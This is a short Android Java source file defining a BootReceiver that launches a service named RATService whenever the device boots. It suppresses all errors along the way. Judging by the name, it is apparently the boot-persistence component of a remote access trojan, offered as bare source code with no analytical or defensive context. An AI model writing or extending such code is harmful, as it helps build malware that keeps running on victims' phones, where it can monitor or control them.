package com.zero.agent;
import android.content.*; import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        try { Intent svc = new Intent(context, RATService.class); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(svc); else context.startService(svc); } catch (Exception ignored) {}
    }
}